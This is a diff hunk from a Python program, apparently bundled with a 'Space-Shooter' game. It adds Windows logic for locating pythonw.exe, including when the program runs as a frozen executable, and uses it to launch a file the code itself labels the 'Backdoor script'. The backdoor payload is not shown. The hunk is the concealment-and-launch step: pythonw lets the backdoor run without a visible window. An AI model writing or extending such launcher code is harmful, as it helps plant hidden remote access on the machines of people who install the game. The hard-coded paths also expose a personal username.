@@ -375,15 +375,48 @@ while True:
         # Launch it
         if os.name == 'nt':  # Windows
             print("[DEBUG] Windows detected")
-            # Find pythonw.exe
-            python_dir = os.path.dirname(sys.executable)
-            pythonw = os.path.join(python_dir, 'pythonw.exe')
             
-            print(f"[DEBUG] Looking for pythonw at: {pythonw}")
+            # Find Python executable
+            # When running as exe, sys.executable is the exe itself, not python
+            if getattr(sys, 'frozen', False):
+                # We're frozen, need to find python in the system
+                import shutil
+                pythonw = shutil.which('pythonw.exe')
+                if not pythonw:
+                    python = shutil.which('python.exe')
+                    if python:
+                        python_dir = os.path.dirname(python)
+                        pythonw = os.path.join(python_dir, 'pythonw.exe')
+                        if not os.path.exists(pythonw):
+                            pythonw = python
+                    else:
+                        # Try common locations and env
+                        possible_paths = [
+                            r'C:\Users\hirwa\Space-Shooter\env\Scripts\pythonw.exe',
+                            r'C:\Users\hirwa\Space-Shooter\env\Scripts\python.exe',
+                            r'C:\Program Files\Python313\pythonw.exe',
+                            r'C:\Program Files\Python312\pythonw.exe',
+                            r'C:\Program Files\Python311\pythonw.exe',
+                            r'C:\Python313\pythonw.exe',
+                            r'C:\Python312\pythonw.exe',
+                            r'C:\Python311\pythonw.exe'
+                        ]
+                        for path in possible_paths:
+                            if os.path.exists(path):
+                                pythonw = path
+                                break
+            else:
+                # Running as script
+                python_dir = os.path.dirname(sys.executable)
+                pythonw = os.path.join(python_dir, 'pythonw.exe')
+                if not os.path.exists(pythonw):
+                    pythonw = sys.executable
             
-            if not os.path.exists(pythonw):
-                print("[DEBUG] pythonw not found, using sys.executable")
-                pythonw = sys.executable
+            print(f"[DEBUG] Found python: {pythonw}")
+            
+            if not pythonw or not os.path.exists(pythonw):
+                print("[ERROR] Could not find Python executable!")
+                return
             
             print(f"[DEBUG] Using python: {pythonw}")
             print(f"[DEBUG] Backdoor script: {backdoor_path}")
